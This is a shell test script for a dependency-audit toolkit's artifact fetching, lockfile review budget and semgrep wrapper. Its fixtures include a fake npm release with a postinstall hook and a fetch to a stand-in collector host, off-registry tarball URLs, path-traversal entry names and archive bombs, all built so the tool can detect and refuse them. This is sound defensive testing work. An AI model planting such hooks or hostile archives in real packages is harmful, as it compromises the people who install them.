  sh -c "[ '$RC' = 0 ] && grep -qxF 'url: https://crates.io/api/v1/crates/demo/1.0.0' '$T/calls' && grep -qxF 'url: https://static.crates.io/crates/demo/demo-1.0.0.crate' '$T/calls' && [ -f '$FA/demo-1.0.0.crate' ] && [ \"\$(cat '$FA/files/demo-1.0.0/src/lib.rs')\" = 'pub fn f() {}' ]"
check "... only regular files and directories, modes 0600 and 0700, whatever the archive says" \
  sh -c "[ -d '$FA/files' ] && [ -z \"\$(find '$FA' ! -type f ! -type d -print)\" ] && [ -z \"\$(find '$FA/files' -type f ! -perm 600 -print)\" ] && [ -z \"\$(find '$FA/files' -type d ! -perm 700 -print)\" ] && [ ! -e '$WT/audit_1/deps/escape.txt' ] && [ ! -e '$FA/escape.txt' ]"
check "... every entry left out is listed: unsafe names, links, special files, a name given twice, one too long to write" \
  sh -c "for w in 'demo-1.0.0/../escape.txt: unsafe name' '/abs.txt: unsafe name' 'demo-1.0.0/link: symbolic link' 'demo-1.0.0/hard: hard link' 'demo-1.0.0/fifo: special file' 'demo-1.0.0/dev: special file' 'demo-1.0.0/esc?name: unsafe name' 'demo-1.0.0/src/lib.rs: the name is taken' 'nnnnnnnnnn: cannot be written: '; do grep -qF \"\$w\" '$WT/audit_1/deps/fetch-artifact-$n.txt' || exit 1; done"
check "... the run directory still passes its check (no link was made)" sh -c "[ -d '$FA/files' ] && (cd '$WT' && '$ROOT/scripts/rundir.sh' check audit_1) >/dev/null"
check "... one disclosure row, before the first request" sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ] && sed -n '\$p' '$DT' | grep -q '	crates.io	crate name and version (the crates.io API, then the .crate download): demo@1.0.0	1\$'"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates demo 2.0.0
n=$(sed -n 's/.*; output audit_1\/deps\/fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/err")
check "a digest that does not match: exit 3, the artifact neither kept nor unpacked" \
  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: the digest does not match: the registry gives sha256 0000' '$T/err' && [ -n '$n' ] && [ ! -e '$WT/audit_1/deps/fetch-artifact-$n' ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 npm left-pad 1.3.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "fetch-artifact npm: the tarball at the URL the registry's name gives, its sha512 integrity checked (its global pax header, of 52 bytes as git archive writes one, let through)" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'url: https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz' '$T/calls' && [ -f '$WT/audit_1/deps/fetch-artifact-$n/files/package/index.js' ] && grep -q '^digest: sha512 ' '$WT/audit_1/deps/fetch-artifact-$n.txt'"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 npm left-pad 1.4.0
check "an npm record whose tarball is elsewhere: exit 3, nothing downloaded" \
  sh -c "[ '$RC' = 3 ] && grep -q 'names the tarball at https://evil.invalid/left-pad-1.4.0.tgz' '$T/err' && ! grep -q 'url: https://evil' '$T/calls'"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 npm left-pad 1.5.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "a version with only a sha1 shasum verifies but the output marks it weak" \
  sh -c "[ '$RC' = 0 ] && grep -q '^digest: sha1 .* (weak: the npm registry offered no sha512 integrity' '$WT/audit_1/deps/fetch-artifact-$n.txt'"
r0=$(rows)
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi demo 1.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "fetch-artifact pypi: a pure-Python wheel from files.pythonhosted.org, unpacked as a zip without its link or unsafe name" \
  sh -c "[ '$RC' = 0 ] && [ -f '$WT/audit_1/deps/fetch-artifact-$n/files/demo/__init__.py' ] && grep -qF '  demo/link.py: symbolic link' '$WT/audit_1/deps/fetch-artifact-$n.txt' && grep -qF '  ../../evil.py: unsafe name' '$WT/audit_1/deps/fetch-artifact-$n.txt'"
check "... and two disclosure rows: the record from pypi.org, the file from pythonhosted.org" \
  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 2 ] && grep -q '	pythonhosted.org	the release file (download): demo-1.0-py3-none-any.whl	1\$' '$DT'"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi demo 2.0
check "a PyPI file outside files.pythonhosted.org: exit 3, nothing downloaded" \
  sh -c "[ '$RC' = 3 ] && grep -q 'not under https://files.pythonhosted.org/packages/' '$T/err' && ! grep -q 'url: https://evil' '$T/calls'"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi many 1.0
check "an artifact of more than 50000 entries: exit 3, nothing unpacked" \
  sh -c "[ '$RC' = 3 ] && grep -q 'the artifact holds more than 50000 entries' '$T/err' && [ -z \"\$(find '$WT/audit_1/deps' -path '*/files/many' -print)\" ]"
# The caps hold while a tar is read, one header at a time: the read stops at entry 50001, so the bytes after it,
# which no deflate stream holds, are never read; and at an entry that declares more than 512 MiB, before the
# read looks for the next one.
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates bomb 1.0.0
check "a .crate of more than 50000 entries is refused at entry 50001, before the rest is read: exit 3, nothing unpacked" \
  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: the artifact holds more than 50000 entries; output ' '$T/err' && [ -z \"\$(find '$WT/audit_1/deps' -path '*/files/bomb-1.0.0' -print)\" ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates bigdecl 1.0.0
check "a .crate entry that declares more than 512 MiB is refused when it is read: exit 3, nothing unpacked" \
  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: the artifact unpacks to more than 512 MiB; output ' '$T/err' && [ -z \"\$(find '$WT/audit_1/deps' -path '*/files/bigdecl-1.0.0' -print)\" ]"
# What tarfile would keep for every later member, or read with no bound, is refused at the header that announces
# it, before tarfile reads it; after the first four cases come bytes no deflate stream holds, so reading on fails.
refused() { # refused <top directory> <blocker>: the last fetch-artifact stopped with it and unpacked nothing
  [ "$RC" = 3 ] && grep -q "^deps: blocker: $2; output " "$T/err" && [ -z "$(find "$WT/audit_1/deps" -path "*/files/$1" -print)" ]
}
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates gkeys 1.0.0
check "a global pax header of 16000 keys is refused at that header, before the file after it: exit 3, nothing unpacked" \
  refused gkeys-1.0.0 'the global pax headers of the artifact hold more than 128 bytes'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates longhdr 1.0.0
check "pax and GNU long-name headers are counted together (2.4 MB of each) and refused past 4 MiB: exit 3, nothing unpacked" \
  refused longhdr-1.0.0 'the pax and GNU long-name headers of the artifact hold more than 4 MiB'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates sparse 1.0.0
check "a GNU sparse file is refused before its map is read: exit 3, nothing unpacked" \
  refused sparse-1.0.0 'the artifact holds a sparse file'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates paxsparse 1.0.0
check "a pax (GNU 1.0) sparse file is refused before its map is read from its data: exit 3, nothing unpacked" \
  refused paxsparse-1.0.0 'the artifact holds a sparse file'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates negsize 1.0.0
check "an entry a global pax header gives a size below zero is refused: exit 3, nothing unpacked" \
  refused negsize-1.0.0 'the artifact gives an entry a size below zero'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates negraw 1.0.0
check "an extended header whose own size field is below zero is refused before it is read: exit 3, nothing unpacked" \
  refused negraw-1.0.0 'the artifact gives an entry a size below zero'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates odd 1.0.0
check "an entry of a type tarfile does not know counts toward 512 MiB too, since tarfile reads through its data: exit 3" \
  refused odd-1.0.0 'the artifact unpacks to more than 512 MiB'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi bigcd 1.0
check "a wheel whose central directory takes more than 16 MiB is refused before zipfile reads it: exit 3, nothing unpacked" \
  refused bigcd 'the central directory of the artifact takes more than 16 MiB'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates gsize 1.0.0
check "a file whose own header gives 600 MiB counts toward 512 MiB though a global pax size says 0, before tarfile reads through it: exit 3" \
  refused gsize-1.0.0 'the artifact unpacks to more than 512 MiB'
# An empty pax header adds nothing to the 4 MiB, and tarfile still parses each one: at most 8 come in a row.
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates chain8 1.0.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "a member after 8 empty pax headers in a row is unpacked" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(cat '$WT/audit_1/deps/fetch-artifact-$n/files/chain8-1.0.0/f')\" = 'abc' ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates chain9 1.0.0
check "... and 9 in a row are refused: exit 3, nothing unpacked" \
  refused chain9-1.0.0 'the artifact holds more than 8 pax and GNU long-name headers in a row'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi manybad 1.0
check "a wheel of more than 50000 entries is refused at central directory record 50001, before zipfile reads the damaged one after it: exit 3" \
  refused manybad 'the artifact holds more than 50000 entries'
# Only decompressors whose memory has a fixed bound run: an xz stream chooses the window its decompressor keeps,
# so deps.sh holds that decompressor to 128 MiB (every xz preset needs at most 65 MiB); a zstd stream is not read,
# and zipfile hands bzip2 a whole read with no bound on what comes out. A stream that no magic names, as one in
# the legacy lzma format (whose header chooses the window too), is read as a plain tar.
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates xz 1.0.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "a .crate compressed with xz is unpacked, its decompressor held to 128 MiB" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(cat '$WT/audit_1/deps/fetch-artifact-$n/files/xz-1.0.0/src/lib.rs')\" = 'pub fn f() {}' ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates xztwo 1.0.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "... and so is one in two xz streams, zero padding between them" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(cat '$WT/audit_1/deps/fetch-artifact-$n/files/xztwo-1.0.0/src/lib.rs')\" = 'pub fn f() {}' ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates xzbig 1.0.0
check "an xz stream whose decompressor would keep a 1 GiB window is refused before it is decompressed: exit 3, nothing unpacked" \
  refused xzbig-1.0.0 'the xz stream of the artifact needs more than 128 MiB to decompress'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates xzbomb 1.0.0
check "the caps hold while an xz stream is read: more than 50000 entries are refused at entry 50001, before the bytes after it: exit 3" \
  refused bomb-1.0.0 'the artifact holds more than 50000 entries'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates zst 1.0.0
check "a .crate that starts as a zstd stream is refused: exit 3, nothing unpacked" \
  refused zst-1.0.0 'the artifact is compressed with zstd, which deps.sh does not unpack (a tar is read plain, or through gzip, bzip2 or xz)'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates alone 1.0.0
check "a .crate in the legacy lzma format, which no magic names, is read as a plain tar and never decompressed: exit 3, nothing unpacked" \
  refused alone-1.0.0 'cannot read the answer or the artifact: truncated header'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi bzwhl 1.0
check "a wheel with an entry compressed with bzip2 is refused before anything is unpacked: exit 3" \
  refused bzwhl 'an entry of the artifact is compressed with a method other than deflate, which deps.sh does not unpack'
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates plain 1.0.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "a .crate that is a plain tar is unpacked" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(cat '$WT/audit_1/deps/fetch-artifact-$n/files/plain-1.0.0/src/lib.rs')\" = 'pub fn f() {}' ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi bzsd 1.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "an sdist compressed with bzip2 is unpacked" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(cat '$WT/audit_1/deps/fetch-artifact-$n/files/bzsd-1.0/bzsd.py')\" = 'pub fn f() {}' ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 pypi xzsd 1.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "... and so is one compressed with xz, as PyPI took them before 2017" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(cat '$WT/audit_1/deps/fetch-artifact-$n/files/xzsd-1.0/xzsd.py')\" = 'pub fn f() {}' ]"
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates nope 1.0.0
check "fetch-artifact of a version the registry does not have: exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> fetch-artifact: crates.io has no nope 1.0.0 (HTTP 404)' '$T/out'"
cp "$DT" "$T/dt.saved"
printf 'not the header\n' > "$DT"
run "$DEPS" "$WT" -- npm-view --run audit_1 left-pad
check "a disclosures.tsv without its header is refused before any request" \
  sh -c "[ '$RC' = 64 ] && grep -q '^deps: refused: audit_1/disclosures.tsv is not a regular file with one link whose first line is the header' '$T/err' && [ ! -s '$T/calls' ]"
cp "$T/dt.saved" "$DT"
ln "$DT" "$T/dt.hardlink"
run "$DEPS" "$WT" -- npm-view --run audit_1 left-pad
check "... and so is one with a second hard link" sh -c "[ '$RC' = 64 ] && [ ! -s '$T/calls' ]"
rm -f "$T/dt.hardlink"

# lock-budget: the CI budget over a set lock-delta.sh set wrote, against the same stand-in registry. The
# publish ages come from one record per name, asked in the budget's order; the budget's entries are fetched
# old and new and compared; a source that is not public is never sent; one disclosure row per service.
python3 -I - "$T/fix" <<'PY'
import base64, hashlib, io, json, os, sys, tarfile, time
fix = sys.argv[1]
def put(url, data, status=None):
    key = url.replace("/", "_").replace(":", "_").replace("%", "_").replace("@", "_")
    open(os.path.join(fix, key), "wb").write(data if isinstance(data, bytes) else data.encode())
    if status:
        open(os.path.join(fix, key + ".status"), "w").write(str(status))
def tgz(top, files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, data in sorted(files.items()):
            ti = tarfile.TarInfo(top + "/" + name)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))
    return buf.getvalue()
def iso(days):
    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(time.time() - days * 86400))
def npm(name, versions, status=None):
    doc = {"name": name, "time": {}, "versions": {}}
    for v, (days, who, files) in versions.items():
        data = tgz("package", files)
        url = "https://registry.npmjs.org/%s/-/%s-%s.tgz" % (name, name, v)
        put(url, data, status)
        rec = {"name": name, "version": v, "_npmUser": {"name": who},
               "dist": {"tarball": url, "integrity": "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()}}
        doc["time"][v] = iso(days)
        doc["versions"][v] = rec
        put("https://registry.npmjs.org/%s/%s" % (name, v), json.dumps(rec))
    put("https://registry.npmjs.org/" + name, json.dumps(doc))
plain = {"package.json": b"{\"name\": \"x\"}\n", "index.js": b"module.exports = 1;\n"}
npm("lb-direct", {"1.0.0": (400, "alice", plain),
                  "1.1.0": (3, "mallory", {"package.json": b"{\"name\": \"x\", \"scripts\": {\"postinstall\": \"node i.js\"}}\n",
                                           "index.js": b"module.exports = 1;\nfetch(\"https://collector.invalid/k\");\n"})})
npm("lb-meta", {"1.0.0": (900, "bob", plain), "2.0.0": (500, "bob", plain)})
npm("lb-young", {"0.1.0": (1, "eve", plain)})
npm("lb-fail", {"1.0.0": (300, "carol", plain)}, 500)
for i in range(1, 46):
    npm("lb-many-%d" % i, {"1.0.0": (300, "dave", plain)})
crates = {}
for v, files in (("0.1.0", {"Cargo.toml": b"[package]\n"}), ("0.2.0", {"Cargo.toml": b"[package]\n", "build.rs": b"fn main() {}\n"})):
    data = tgz("lb_crate-" + v, files)
    put("https://static.crates.io/crates/lb_crate/lb_crate-%s.crate" % v, data)
    crates[v] = {"num": v, "crate": "lb_crate", "created_at": iso(200 if v == "0.1.0" else 100).replace("Z", "+00:00"),
                 "published_by": {"login": "ferris"}, "checksum": hashlib.sha256(data).hexdigest()}
    put("https://crates.io/api/v1/crates/lb_crate/" + v, json.dumps({"version": crates[v]}))
put("https://crates.io/api/v1/crates/lb_crate", json.dumps({"versions": list(crates.values())}))
put("https://pypi.org/pypi/lb-py/json", json.dumps({"releases": {"1.0": [{"upload_time_iso_8601": iso(2)}]}}))
PY
H='eco	lockfile	name	old	new	oldsource	source	marks'
lb_set() { # lb_set <n> <row>...: audit_1/deps/lock-set-<n>.tsv, the header and the rows
  { printf '%s\n' "$H"; shift; for r in "$@"; do printf '%s\n' "$r"; done; } > "$WT/audit_1/deps/lock-set-$LBN.tsv"
}
lb_order() { sed -n 's/^url: //p' "$T/calls" | tr '\n' ' '; }
LBN=101
lb_set "$LBN" 'npm	package-lock.json	lb-direct	1.0.0	1.1.0	public	public	direct' \
  'npm	package-lock.json	lb-meta	-	2.0.0	-	public	-' \
  'npm	package-lock.json	lb-young	-	0.1.0	-	public	-' \
  'crates	Cargo.lock	lb_crate	0.1.0	0.2.0	public	public	pin' \
  'npm	package-lock.json	lb-git	-	1.0.0	-	git	-' \
  'pypi	uv.lock	lb-py	-	1.0	-	public	direct'
r0=$(rows)
run "$DEPS" "$WT" HTTPS_PROXY="$PROXY" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
LB=$WT/audit_1/deps/lock-budget-$n
check "lock-budget: one record per public name, in the budget's order (direct, then pins, then the rest), none for a git source" \
  sh -c "[ '$RC' = 1 ] && lb=\$(sed -n 's/^url: //p' '$T/calls' | sed -n 1,5p | tr '\n' ' ') && [ \"\$lb\" = 'https://registry.npmjs.org/lb-direct https://pypi.org/pypi/lb-py/json https://crates.io/api/v1/crates/lb_crate https://registry.npmjs.org/lb-meta https://registry.npmjs.org/lb-young ' ] && ! grep -q 'lb-git' '$T/calls'"
check "... the npm record asked compressed, with the proxy" \
  sh -c "grep -q '^== curl -q --proto =https --proto-redir =https --tlsv1.2 -sS --connect-timeout 30 --max-time [0-9]* --max-filesize 104857600 -A .* -H Accept: application/json --compressed -o .* -- https://registry.npmjs.org/lb-direct\$' '$T/calls' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/calls'"
check "... the publish ages: three under 14 days, two first releases, a publisher who published no earlier version" \
  sh -c "grep -q '^>> publish age: 5 names asked in [0-9]* s; not checked: 0 of 5 rows; under 14 days: 3; first releases: 2; publisher changes: 1; yanked: 0; not listed by the registry: 0\$' '$T/out' && grep -q '^npm	lb-direct	1.1.0	[0-9T:Z-]*	3	mallory	alice	young,publisher-change\$' '$LB/ages.tsv'"
check "... the budget: direct, pin, then the young version; the old package metadata only, the git row never fetched" \
  sh -c "grep -qxF '>> budget: 3 entries to compare (direct 1, pin 1, key 0, install 0, young 1, source-change 0); over the 40-entry budget: 0; metadata only: 1; PyPI rows, metadata only: 1; same version with a new checksum: 0; not public, never fetched (SC-061): 1; a version outside its registry grammar, never sent: 0' '$T/out' && ! grep -q 'lb-meta/-/' '$T/calls'"
check "... old and new fetched from the URLs the records give (the npm record from the age answer, not asked again), and compared" \
  sh -c "grep -qxF '>> artifacts: 3 entries, 5 artifacts fetched, 0 failed after one retry' '$T/out' && [ \$(grep -c '^url: https://registry.npmjs.org/lb-direct/1.1.0\$' '$T/calls') = 0 ] && [ -f '$LB/1/new/files/package/index.js' ] && [ -f '$LB/1/old/files/package/index.js' ] && [ -f '$LB/2/new/files/lb_crate-0.2.0/build.rs' ]"
check "... the sweep, counts first: the new postinstall and build.rs (SC-059), the new fetch (SC-060)" \
  sh -c "grep -qxF '>> sweep: SC-059 2 hits in 2 entries, SC-060 1 hits in 1 entries, binary files added or changed 0 in 0 entries; the hits are in the report' '$T/out' && grep -q '^1. npm lb-direct 1.0.0 -> 1.1.0 \[direct,young\] SC-059 1, SC-060 1, binary 0; files +0 ~2 -0\$' '$LB.txt' && grep -qF 'SC-060 index.js:2: fetch(\"https://collector.invalid/k\");' '$LB.txt' && grep -q '^SC-059 build.rs:0: a build.rs file added\$' '$LB.txt'"
check "... one disclosure row per service for the whole run, each naming the set" \
  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 3 ] && tail -n 3 '$DT' | cut -f3 | tr '\n' ' ' | grep -qxF 'npmjs.org crates.io pypi.org ' && [ \$(tail -n 3 '$DT' | grep -c 'audit_1/deps/lock-set-$LBN.tsv	1\$') = 3 ]"
check "... the run directory still passes its check" sh -c "(cd '$WT' && '$ROOT/scripts/rundir.sh' check audit_1) >/dev/null"
r0=$(rows)
run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
check "lock-budget with AUDITOR_PUBLISH_AGE=off: no record of a whole package, each version's record instead, nothing to PyPI" \
  sh -c "[ '$RC' = 1 ] && grep -q '^>> publish age: off (AUDITOR_PUBLISH_AGE=off): not checked: 5 of 5 rows\$' '$T/out' && ! grep -qxF 'url: https://registry.npmjs.org/lb-direct' '$T/calls' && grep -qxF 'url: https://registry.npmjs.org/lb-direct/1.1.0' '$T/calls' && ! grep -q 'pypi.org' '$T/calls' && grep -q '^>> budget: 2 entries to compare (direct 1, pin 1, ' '$T/out'"
check "... two rows, npmjs.org and crates.io, that say only the selected versions go out" \
  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 2 ] && tail -n 2 '$DT' | grep -c 'budget selects' | grep -qx 2"
LBN=102
lb_set "$LBN" 'npm	package-lock.json	lb-fail	-	1.0.0	-	public	install' 'npm	package-lock.json	lb-direct	1.0.0	1.1.0	public	public	direct'
run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
n=$(sed -n 's/.*; output audit_1\/deps\/lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/err")
check "lock-budget: an artifact that still fails after one retry: exit 3 with the count, once the rest are compared" \
  sh -c "[ '$RC' = 3 ] && grep -qxF 'deps: blocker: 1 of 3 selected artifacts could not be fetched after one retry; output audit_1/deps/lock-budget-$n.txt' '$T/err' && [ \$(grep -c '^url: https://registry.npmjs.org/lb-fail/-/lb-fail-1.0.0.tgz\$' '$T/calls') = 2 ] && grep -q '^1. npm lb-direct 1.0.0 -> 1.1.0 \[direct,young\] SC-059 1' '$WT/audit_1/deps/lock-budget-$n.txt' && grep -q '^  not fetched: npm lb-fail 1.0.0: HTTP 500 from ' '$WT/audit_1/deps/lock-budget-$n.txt'"
LBN=103
rowsfile=()
for i in $(seq 1 45); do rowsfile+=("npm	package-lock.json	lb-many-$i	-	1.0.0	-	public	direct"); done
lb_set "$LBN" "${rowsfile[@]}"
run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "lock-budget over 45 direct entries: the first 40 compared, 5 counted over the budget and never fetched" \
  sh -c "[ '$RC' = 0 ] && grep -q '^>> budget: 40 entries to compare (direct 40, .*); over the 40-entry budget: 5; ' '$T/out' && grep -qxF '>> artifacts: 40 entries, 40 artifacts fetched, 0 failed after one retry' '$T/out' && grep -qxF 'url: https://registry.npmjs.org/lb-many-40/-/lb-many-40-1.0.0.tgz' '$T/calls' && ! grep -q 'lb-many-4[1-5]' '$T/calls' && grep -qxF '  npm lb-many-45 - -> 1.0.0 [direct]' '$WT/audit_1/deps/lock-budget-$n.txt'"
LBN=104
lb_set "$LBN"
r0=$(rows)
run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
r1=$(rows)
check "lock-budget over an empty set: exit 0, no request and no disclosure row" \
  sh -c "[ '$RC' = 0 ] && grep -q '^>> lock-budget: nothing flagged: audit_1/deps/lock-budget-[0-9]*[.]txt\$' '$T/out' && ! grep -q '^== curl' '$T/calls' && [ '$r1' = '$r0' ]"
LBN=105
lb_set "$LBN" 'npm	package-lock.json	../lb-up	-	1.0.0	-	public	direct' 'npm	package-lock.json	lb-meta	-	2.0.0	-	public	-'
run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "lock-budget: a row whose name is outside npm's grammar is never sent" \
  sh -c "[ '$RC' = 0 ] && ! grep -q 'lb-up' '$T/calls' && grep -qxF 'url: https://registry.npmjs.org/lb-meta' '$T/calls' && grep -q '; 1 lines that are not a row of the set, never sent\$' '$WT/audit_1/deps/lock-budget-$n.txt'"
run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=maybe -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
check "lock-budget: an AUDITOR_PUBLISH_AGE other than on or off is refused before any request" \
  sh -c "[ '$RC' = 64 ] && grep -qxF \"deps: refused: AUDITOR_PUBLISH_AGE is 'maybe', not on or off\" '$T/err' && [ ! -s '$T/calls' ]"

# =================================================================================================
# sast.sh: semgrep with allowlisted rulesets, its SARIF in R/sast.
# =================================================================================================
settings FAKE_RESULTS=3 FAKE_SEMGREP_RC=1
r0=$(rows)
run "$SAST" "$WT" "${CANARIES[@]}" HTTPS_PROXY="$PROXY" -- semgrep --run audit_1 --path . --ruleset p/rust --ruleset p/trailofbits
check "sast: 3 results, exit 1, the SARIF and the log kept" \
  sh -c "[ '$RC' = 1 ] && [ \"\$(sed -n '\$p' '$T/out')\" = '>> semgrep: 3 results (exit 1): audit_1/sast/semgrep-1.sarif; log audit_1/sast/semgrep-1.log' ] && [ -s '$WT/audit_1/sast/semgrep-1.sarif' ] && grep -q 'semgrep: scanning' '$WT/audit_1/sast/semgrep-1.log'"
check "sast: the fixed command line, from the scratch directory, on the working directory" calls_are \
  "semgrep scan --config p/rust --config p/trailofbits --metrics=off --disable-version-check --sarif --output $S/out.sarif --error -- $WT|"
check "... its settings in the scratch directory, no version check, no metrics, the proxy, and no canary" \
  sh -c "grep -qxF 'cwd: $S' '$T/calls' && grep -qxF 'settings-file: $S/semgrep-settings.yml' '$T/calls' && grep -qxF 'env: SEMGREP_ENABLE_VERSION_CHECK=0' '$T/calls' && grep -qxF 'env: SEMGREP_SEND_METRICS=off' '$T/calls' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/calls' && ! grep -q canary '$T/calls'"
check "... with the real HOME, where semgrep may be installed" grep -qxF "home: $CLEANHOME" "$T/calls"
check "... and one disclosure row naming the rulesets" \
  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ] && sed -n '\$p' '$DT' | grep -q '	scripts/runner/sast.sh	semgrep.dev	ruleset ids (the semgrep registry, for the rules): p/rust p/trailofbits	2\$'"
# semgrep lists the files of a folder in a git project with git (the stand-in does too), and that git gets a
# repository in the scratch directory, never the working directory's: none of the programs and hooks the
# working directory's config names runs, and git lists what the repository's index and ignore rules give.
check "... semgrep's git ran none of the programs or hooks the repository's config names" test -z "$(ls -A "$T/marks")"
check "... its git got GIT_DIR, a repository in the scratch directory, with the working directory as its work tree" \
  sh -c "grep -qxF 'env: GIT_DIR=$S/git' '$T/calls' && grep -qxF 'env: GIT_WORK_TREE=$WT' '$T/calls' && grep -qxF 'env: GIT_CONFIG_GLOBAL=/dev/null' '$T/calls' && grep -qxF 'env: GIT_CONFIG_NOSYSTEM=1' '$T/calls'"
check "... which lists the tracked files, and the untracked ones git does not ignore" \
  sh -c "grep -qE '^git-cached: 0 (.* )?programs/demo/src/lib.rs ' '$T/calls' && grep -qE '^git-others: 0 (.* )?sub/Cargo.lock ' '$T/calls' && ! grep -q '^git-others: .*audit_1/' '$T/calls'"
settings FAKE_RESULTS=0
run "$SAST" "$WT" -- semgrep --run audit_1 --path a.rs --ruleset p/secrets
check "sast on a file, no results: exit 0" sh -c "[ '$RC' = 0 ] && grep -q '^>> semgrep: 0 results (exit 0): audit_1/sast/semgrep-[0-9]*[.]sarif' '$T/out' && grep -q -- '-- $WT/a.rs\$' '$T/calls'"
settings FAKE_SEMGREP_RC=2
run "$SAST" "$WT" -- semgrep --run audit_1 --path . --ruleset p/rust
check "semgrep that fails: exit 3, its log kept" sh -c "[ '$RC' = 3 ] && grep -q '^sast: blocker: semgrep failed (exit 2): .*; log audit_1/sast/semgrep-[0-9]*[.]log\$' '$T/err'"
settings FAKE_SARIF=none
run "$SAST" "$WT" -- semgrep --run audit_1 --path . --ruleset p/rust
check "semgrep that writes no SARIF: exit 3" sh -c "[ '$RC' = 3 ] && grep -q '^sast: blocker: semgrep wrote no SARIF; log ' '$T/err'"
settings FAKE_SLEEP=30
run "$SAST" "$WT" AUDITOR_RUN_TIMEOUT=2 -- semgrep --run audit_1 --path . --ruleset p/rust
check "AUDITOR_RUN_TIMEOUT bounds the scan" sh -c "[ '$RC' = 3 ] && grep -q '^sast: blocker: semgrep passed the 2-second limit (AUDITOR_RUN_TIMEOUT) and was killed' '$T/err'"
settings
printf 'programs/\n' > "$WT/src/.semgrepignore"
run "$SAST" "$WT" -- semgrep --run audit_1 --path . --ruleset p/rust
